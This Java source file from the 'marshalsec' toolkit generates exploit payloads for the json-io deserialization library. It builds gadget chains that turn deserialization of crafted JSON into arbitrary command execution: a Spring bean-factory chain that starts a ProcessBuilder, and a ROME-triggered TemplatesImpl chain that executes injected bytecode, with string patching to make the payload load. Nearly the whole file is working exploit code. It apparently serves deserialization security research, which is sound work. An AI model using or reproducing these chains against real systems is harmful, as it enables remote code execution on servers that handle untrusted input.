/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.util.Arrays;

import javax.xml.transform.Templates;

import com.cedarsoftware.util.io.JsonReader;
import com.cedarsoftware.util.io.JsonWriter;

import marshalsec.gadgets.Args;
import marshalsec.gadgets.TemplatesUtil;
import marshalsec.gadgets.Groovy;
import marshalsec.gadgets.JDKUtil;
import marshalsec.gadgets.LazySearchEnumeration;
import marshalsec.gadgets.Primary;
import marshalsec.gadgets.Resin;
import marshalsec.gadgets.Rome;
import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
import marshalsec.gadgets.SpringUtil;
import marshalsec.gadgets.UnicastRefGadget;
import marshalsec.gadgets.UnicastRemoteObjectGadget;
import marshalsec.gadgets.XBean;


/**
 * 
 * 
 * Not applicable:
 * - BindingEnumeration: cannot construct BindingEnumeration
 * - SpringPartiallyComparableAdvisorHolder: cannot construct AspectJPointcutAdvisor
 * - CommonsConfiguration: cannot restore additional properties in map/set
 * - ServiceLoader: cannot construct URLClassPath
 * - ImageIO: cannot construct FilterIterator as it dereferences a null iterator
 * 
 * @author mbechler
 */
public class JsonIO extends MarshallerBase<String> implements UnicastRefGadget, UnicastRemoteObjectGadget, Groovy,
        SpringAbstractBeanFactoryPointcutAdvisor, Rome, XBean, Resin, LazySearchEnumeration {

    @Override
    public String marshal ( Object o ) throws Exception {
        return JsonWriter.objectToJson(o);
    }


    @Override
    public Object unmarshal ( String data ) throws Exception {
        return JsonReader.jsonToJava(data);
    }


    @Override
    public Object makeEqualsTrigger ( Object tgt, Object sameHash ) throws Exception {
        // make sure that nested maps are restored first
        return Arrays.asList(tgt, sameHash, JDKUtil.makeMap(tgt, sameHash));
    }


    @Override
    public Object makeHashCodeTrigger ( Object o ) throws Exception {
        // make sure that nested maps are restored first
        return Arrays.asList(o, JDKUtil.makeMap(o, o));
    }


    /**
     * Example with default bean factory method trigger instead, alt strategy required for ProcessBuilder
     */
    @Args ( minArgs = 1, args = {
        "cmd", "args..."
    }, defaultArgs = {
        MarshallerBase.defaultExecutable
    } )
    @Override
    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
        return SpringUtil
                .makeBeanFactoryTriggerBFPA(uf, "caller", SpringUtil.makeMethodTrigger(new ProcessBuilder(args), "start"));
    }


    /**
     * 
     * Example with ROME triggering TemplatesImpl direct bytecode execution
     */
    @Override
    @Primary
    @Args ( minArgs = 1, args = {
        "cmd", "args..."
    }, defaultArgs = {
        MarshallerBase.defaultExecutable, "/tmp/foo"
    } )
    public Object makeRome ( UtilFactory uf, String[] args ) throws Exception {
        Object tpl = TemplatesUtil.createTemplatesImpl(args);
        String marshalled = marshal(makeROMEAllPropertyTrigger(uf, Templates.class, (Templates) tpl));
        // add the transient _tfactory field
        marshalled = marshalled.replace(
            "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",",
            "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_tfactory\""
                    + ": {\"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"},");
        return marshalled;
    }


    public static void main ( String[] args ) {
        new JsonIO().run(args);
    }

}
